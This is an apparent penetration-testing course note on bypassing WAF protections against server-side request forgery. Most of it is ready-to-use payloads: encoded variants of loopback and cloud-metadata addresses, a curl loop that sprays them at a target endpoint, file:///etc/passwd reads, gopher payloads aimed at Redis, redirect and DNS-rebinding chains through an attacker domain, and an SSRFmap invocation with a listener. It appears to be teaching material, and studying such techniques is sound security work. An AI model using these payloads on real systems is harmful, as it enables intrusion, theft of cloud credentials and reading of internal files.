---
tags: [vapt, ssrf, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.17 SSRF WAF Bypass"
---

# 13.17 — SSRF WAF Bypass

## WAF SSRF Protection Approaches

```
WAFs TYPICALLY:
  1. Block requests containing 169.254.169.254
  2. Block requests containing 127.0.0.1 or localhost
  3. Block requests containing internal IP ranges (10.x, 192.168.x, 172.16-31.x)
  4. Block non-HTTP protocols (gopher://, file://, dict://)
  5. Block requests with @ sign in URL
  
  ALL OF THESE CAN BE BYPASSED!
```

---

## IP Address Bypass Techniques

```bash
# BYPASS BLOCKLIST FOR 127.0.0.1:
bypass_127=(
  "127.1"
  "127.0.1"
  "0.0.0.0"
  "0x7f000001"
  "0177.0.0.1"
  "2130706433"
  "[::1]"
  "[0000::1]"
  "[::ffff:127.0.0.1]"
  "[::ffff:7f00:1]"
  "localhost"                    # if not blocked
  "127.0.0.1.nip.io"
  "0177.1"                       # octal+short
  "00127.0.0.1"                  # leading zeros
  "127.00.00.01"
  "127.0.0.1%20"                 # trailing space
  "127.0.0.1%09"                 # trailing tab
)

# BYPASS FOR 169.254.169.254:
bypass_meta=(
  "169.254.169.254"              # test if really blocked
  "2852039166"                   # decimal
  "0xa9fea9fe"                   # hex
  "0251.0376.0251.0376"          # octal
  "[::ffff:169.254.169.254]"    # IPv6
  "[::ffff:a9fe:a9fe]"          # IPv6 hex
  "169.254.169.254.nip.io"      # nip.io
  "http://A.B.rbndr.us"         # DNS rebinding
)

# SCRIPT TO TEST ALL BYPASSES:
for payload in "${bypass_127[@]}"; do
  result=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 \
    -X POST "https://target.com/fetch" \
    -d "url=http://$payload/" \
    -H "Cookie: session=YOURS")
  echo "$payload → $result"
done
```

---

## URL Encoding and Double Encoding

```bash
# SINGLE URL ENCODING:
# 127.0.0.1 → 127%2E0%2E0%2E1
# gopher:// → gopher%3A%2F%2F
# localhost → %6c%6f%63%61%6c%68%6f%73%74

# DOUBLE URL ENCODING (if WAF decodes once):
# gopher → %67%6f%70%68%65%72 → URL encode again → %2567%256f...
# When WAF decodes: %25 → % → %67%6f... (looks harmless)
# When app decodes: %67%6f%70%68%65%72 → gopher

# TEST:
url = "http://127%2E0%2E0%2E1/admin"
url = "http://127%2E0%2E0%2E1%2Fadmin"  # slash encoded too
url = "gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING"
```

---

## Protocol Filter Bypass

```bash
# IF gopher:// IS BLOCKED:
# Try case variation:
url=Gopher://127.0.0.1:6379/_PING
url=GOPHER://127.0.0.1:6379/_PING

# URL encode the scheme:
url=gopher%3A//127.0.0.1:6379/_PING
url=gopher%3A%2F%2F127.0.0.1:6379/_PING

# Try with extra slashes:
url=gopher:///127.0.0.1:6379/_PING

# IF file:// IS BLOCKED:
url=FILE:///etc/passwd
url=File:///etc/passwd
url=file://localhost/etc/passwd
url=file://///etc/passwd  # extra slashes
```

---

## Open Redirect Chain (Most Reliable Bypass)

```
SCENARIO: 
  SSRF filters properly block all internal IPs and protocols.
  BUT: App has an open redirect vulnerability on a trusted domain!
  
CHAIN:
  1. Find open redirect on a domain the filter allows:
     target.com/redirect?url=https://anywhere.com
     
  2. Use the open redirect as SSRF target:
     url=https://target.com/redirect?url=http://169.254.169.254/
     
  3. Filter: "target.com is allowed" → approved!
  4. Server fetches target.com/redirect → redirected to 169.254.169.254!
  5. Server follows redirect → SSRF!

FINDING OPEN REDIRECTS:
  - ?redirect=
  - ?return=
  - ?next=
  - ?url= (on trusted domain!)
  - OAuth callback URLs
  - Login redirect parameters

PortSwigger Lab Scenario:
  Fetch URL contains /product/nextProduct?path=... which redirects!
  url=http://target.com/product/nextProduct?path=http://169.254.169.254/
  → Open redirect bypasses SSRF filter!
```

---

## Subdomain / Trusted Domain Bypass

```
IF FILTER ALLOWS SPECIFIC DOMAINS:
  Allowed: *.company.com, api.service.com
  
  Find: api.service.com has an open redirect!
  Use: url=https://api.service.com/redirect?to=http://169.254.169.254/
  
  OR: Register: company.com.evil.com
  Filter (weak): if 'company.com' in url → allow
  Attack: url=http://company.com.evil.com.169.254.169.254.nip.io/
  → Resolves to 169.254.169.254!

DNS REBINDING AGAINST WHITELISTED DOMAINS:
  Register: evil.com (own domain)
  Add to whitelist somehow (or use existing whitelisted domain)
  Configure DNS to alternate between legit and internal IP
  Bypass!
```

---

## Automated WAF Bypass Testing

```bash
# USE SSRFMAP FOR AUTOMATED BYPASS:
pip3 install ssrfmap
# Or:
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap

# SAVE REQUEST TO FILE (from Burp: right-click → Save item):
# request.txt:
# POST /fetch HTTP/1.1
# Host: target.com
# Cookie: session=YOURS
# Content-Type: application/x-www-form-urlencoded
# 
# url=http://example.com

# RUN SSRFMAP:
python3 ssrfmap.py \
  -r request.txt \
  -p url \
  -m all \
  --lhost YOUR_IP \
  --lport 4444

# MODULES: portscan, networkscan, aws, gcp, azure, docker, redis, elastic...
```

---

## WAF Bypass Decision Tree

```
SSRF BLOCKED?
  │
  ├─→ Try alternative IP representations (decimal, hex, octal, IPv6)
  │     Bypassed? → STOP HERE
  │
  ├─→ Try DNS-based bypass (nip.io, rbndr.us, DNS rebinding)
  │     Bypassed? → STOP HERE
  │
  ├─→ Try URL parser confusion (@, backslash, encoding)
  │     Bypassed? → STOP HERE
  │
  ├─→ Find open redirect on allowed domain → chain SSRF
  │     Bypassed? → STOP HERE
  │
  ├─→ Try alternative protocols (gopher, dict, file)
  │     Bypassed? → STOP HERE
  │
  └─→ Try blind SSRF via headers (Referer, X-Forwarded-Host)
        Bypassed? → Confirm with Collaborator → STOP HERE
        
NOT BYPASSED? → SSRF may not be exploitable via URL filters (report as best-effort finding)
```

---

## Related Notes
- [[14 - SSRF Localhost Bypass]] — IP-specific bypass
- [[15 - SSRF DNS Rebinding]] — DNS-level bypass
- [[16 - SSRF URL Parser Confusion]] — parser tricks
- [[13 - SSRF Protocol Smuggling]] — protocol-level bypass
- [[20 - Defense Allowlists IMDSv2]] — how defenses should work
